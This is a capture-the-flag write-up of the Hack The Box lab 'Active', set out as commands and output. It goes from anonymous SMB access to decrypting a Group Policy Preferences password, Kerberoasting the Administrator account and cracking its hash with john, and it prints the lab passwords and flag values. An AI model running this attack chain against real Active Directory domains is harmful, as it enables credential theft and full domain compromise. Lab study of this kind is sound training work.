---
icon: wave-pulse
---

# HTB-ACTIVE

<figure><img src="../../../../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

### Attack Chain Summary

1. **Network Reconnaissance** → Port scanning and service enumeration
2. **SMB Enumeration** → Anonymous access to Replication share
3. **GPP Password Extraction** → Finding credentials in Groups.xml
4. **GPP Decryption** → Converting encrypted password to plaintext
5. **Domain Authentication** → Using SVC\_TGS credentials
6. **Kerberoasting Attack** → Extracting Administrator service ticket
7. **Password Cracking** → Breaking Administrator password hash
8. **Domain Admin Access** → Full system compromise

***

### Phase 1: Network Reconnaissance

#### Rustscan Port Discovery

Using rustscan for comprehensive port scanning with aggressive options:

```bash
rustscan -a 10.10xxx  blah balh blah commands
```

**Key Open Ports Identified:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb)
445/tcp   open  microsoft-ds  Microsoft Windows SMB
464/tcp   open  kpasswd5      Kerberos Password Change
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    LDAPS (Secure LDAP)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Global Catalog)
3269/tcp  open  tcpwrapped    LDAPS Global Catalog
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
```

**Analysis:** The port scan reveals a Windows Active Directory Domain Controller with typical AD services running.

***

### Phase 2: SMB Enumeration

#### Anonymous Share Discovery

**Using smbclient for share enumeration:**

```bash
smbclient -U '%' -L //10.10.10.100
```

**Output:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
Replication     Disk      
SYSVOL          Disk      Logon server share 
Users           Disk
```

#### Testing Share Access

```bash
# Testing Users share (Access Denied)
smbclient //10.10.10.100/Users -U "%"
# Result: tree connect failed: NT_STATUS_ACCESS_DENIED

# Testing Replication share (Successful)
smbclient //10.10.10.100/Replication -U "%"
# Result: Access granted!
```

#### CrackMapExec Share Verification

```bash
crackmapexec smb 10.10.10.100 -u '' -p '' --shares
```

**Output:**

```
SMB         10.10.10.100    445    DC               [+] active.htb\: 
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share 
SMB         10.10.10.100    445    DC               Users
```

***

### Phase 3: Data Extraction from Replication Share

#### Recursive Download of All Files

```bash
smbclient //10.10.10.100/Replication -U "%" -c "recurse ON; prompt OFF; mget *"
```

**Files Downloaded:**

```
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
```

#### Critical File Discovery: Groups.xml

The most important file is `Groups.xml` located at:

```
\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
```

**Groups.xml Content:**

```xml
<User name="active.htb\SVC_TGS" 
      cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" />
```

**Key Information Extracted:**

* **Username:** `active.htb\SVC_TGS`
* **Encrypted Password (cpassword):** `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

***

### Phase 4: Group Policy Preferences (GPP) Password Decryption

#### Understanding GPP Vulnerability

Group Policy Preferences (GPP) allowed administrators to store passwords in XML files. Microsoft used a static AES-256 key for encryption, which was publicly disclosed, making these passwords easily decryptable.

#### Decrypting the Password

```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

**Decrypted Password:** `GPPstillStandingStrong2k18`

**Credentials Obtained:**

* Username: `SVC_TGS`
* Password: `GPPstillStandingStrong2k18`

***

### Phase 5: Domain Authentication and Share Re-enumeration

#### Validating Credentials with CrackMapExec

```bash
crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

**Output:**

```
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ
```

#### Advanced Share Permissions Check with SMBMap

```bash
smbmap -H 10.10.10.100 -u SVC_TGS -p 'GPPstillStandingStrong2k18'
```

**Output:**

```
[+] IP: 10.10.10.100:445        Name: 10.10.10.100              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

***

### Phase 6: Kerberoasting Attack

#### Understanding the Attack

The username `SVC_TGS` suggests this is a service account. Service accounts often have Service Principal Names (SPNs) registered, making them vulnerable to Kerberoasting attacks.

#### Extracting Service Tickets

```bash
GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request
```

**Output:**

```
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 19:06:40.351723  2025-09-04 07:21:23.022164             

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5533200b7710e38408930656f7836793$ac0d98e86e62a90ead3782ffaac0fafd66496157434edc9a43f6bd66474148adc102adf11920e979baa4f4cb86fa78efec7b13a24f74a10f0a29e2fea12dba49686108cdea6c6615de69d8791d868952c97efa81cc52a4cdb865257078e5e8ee04933b86740ca5a17b648b999f18304fc01339c7b5856b2527546dc816f0ddcb796c43804dea2190c8fa3a4770ca2b690948a37ea32db6bd3faf3f6310f71ae98de251a64892eefdd72d0d9030bac59a434e8592b74e9b6b2bbee30e39c98119dba3acdfc8596859c0385d80e7c3862576e141395dce23b77e25e687e7dcbc84a7340beaf3ab0fe2c3608888755759d0c39d656c59f96b00bf99c4c1c06b9a490c4b7a8c342fe33a0bf58b28cf8192290d09f28096105e8fe034fadc60ee78b16202fc76e9294a6873ec066332aa9366828eedaeefb000436709ede00517ab3d0b32167b82abea623dcfcb2eff2e01f0eee9cfd432514ba9a08272b09870c5b0112a22a59343b66cbb37420dd8388cfb891332df5f56bfbbd52469d2c4bf763cb1abb7a3813113ea51da0eb540336207ab468553d7c0d9049372bf7d003756745c5c0845acb11a6ea120596858f6ce0ab351f27f81c401d8b050cc9bade944948a3be80b7c7cb9f081abb1eb4291c0eb3f45c696df4409d1e46af1a431c560a3fc55d8ab418f388b1d8ad098f3b913fad6e3bb8d570fe956a6ab3dc8422e95608a464fc5692286329c795cfa462e5345021bd5088f511186a4a48c13c8c710854d5f6774a48ce80284292e55e76c44eed3c8cb12ec5d5a02f507b2553cfaecdc1cc9340ed87d46436049a7383c1703dc50712f25cb97d5ef18829dcc5fcb2fa60b0c27661945bf7122c0650b73919c12aced7d94e93ca2aa7ab03a4b4b17b921a48b7b2b99bb6c03c9d37828d0676cb981d17786d630ec489632e6a5ecffe698c5de4efb13df6a640309504e7edb11a9917dc9fdfb4eb547020a629ba7424ffdf0d51c5fe1997620f933135258dcf2b1dc9c0c7692bb892080e53f8dddb9cf3db3ed57cc9b24b5ea92a6177b4e02a6ae188c562ae8127254fc11d3cbb99155dc7ed10e4f815dc1ad8c7126f28628de912506a056ff295d14b54a789661d37abbc9173e00986a7924a9a017c74bca55b82de1ab9bdb1472a882410109ae8d34324749b9b745beb37cee5060c3a7d34d7fffe8c3b411aac06f67d8e31b3d4fbbdd2e9cc06f59a602c4ccb2d8e02fc25a9c75b3aa1b00fedbfa5de7
```

**Key Findings:**

* Successfully extracted Kerberos TGS ticket for **Administrator** account
* The ticket is in John the Ripper format (krb5tgs$23$...)
* Administrator account has SPN: `active/CIFS:445`

***

### Phase 7: Password Hash Cracking

#### Preparing the Hash File

```bash
nano hash.txt
# Paste the extracted Kerberos ticket hash
```

#### Cracking with John the Ripper

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Output:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:02 DONE (2025-09-05 09:45) 0.3597g/s 3791Kp/s 3791Kc/s 3791KC/s Tiffani1432..Thehunter22
```

**Administrator Credentials Cracked:**

* Username: `Administrator`
* Password: `Ticketmaster1968`

***

### Phase 8: Domain Administrator Access and Flag Retrieval

#### Accessing Administrative Shares

```bash
smbclient //10.10.10.100/C$ -U 'Administrator'
# Password: Ticketmaster1968
```

#### User Flag Retrieval

```bash
smb: \> cd \Users\SVC_TGS\Desktop\
smb: \Users\SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 15:14:42 2018
  ..                                  D        0  Sat Jul 21 15:14:42 2018
  user.txt                           AR       34  Thu Sep  4 07:21:19 2025

smb: \Users\SVC_TGS\Desktop\> get user.txt
getting file \Users\SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec)
```

#### Root Flag Retrieval

```bash
smb: \Users\SVC_TGS\Desktop\> cd \Users\Administrator\Desktop\
smb: \Users\Administrator\Desktop\> get root.txt
getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0.0 KiloBytes/sec)
```

#### Flag Contents

```bash
cat user.txt root.txt
```

**Flags Captured:**

* **User Flag:** `2b5b912b5d81b3c1b60425e79a91f7e2`
* **Root Flag:** `a90bdea91cc985d178b6311ad2941c01`

***

### Technical Analysis and Vulnerability Assessment

#### Critical Vulnerabilities Exploited

1. **Anonymous SMB Access**
   * The Replication share was accessible without authentication
   * Allowed extraction of sensitive Group Policy files
2. **Group Policy Preferences Password Storage**
   * Passwords stored in XML files using known Microsoft AES key
   * Easy decryption using publicly available tools
3. **Service Account Misconfiguration**
   * SVC\_TGS account had sufficient privileges for Kerberoasting
   * Weak service account management practices
4. **Weak Administrator Password**
   * Administrator used a dictionary password vulnerable to cracking
   * No complex password policy enforcement

#### Attack Chain Effectiveness

The attack demonstrated a classic Active Directory compromise pattern:

1. **Anonymous Access** → **Low Privilege User** → **Service Account** → **Domain Administrator**

<figure><img src="../../../../.gitbook/assets/complete (34).gif" alt=""><figcaption></figcaption></figure>
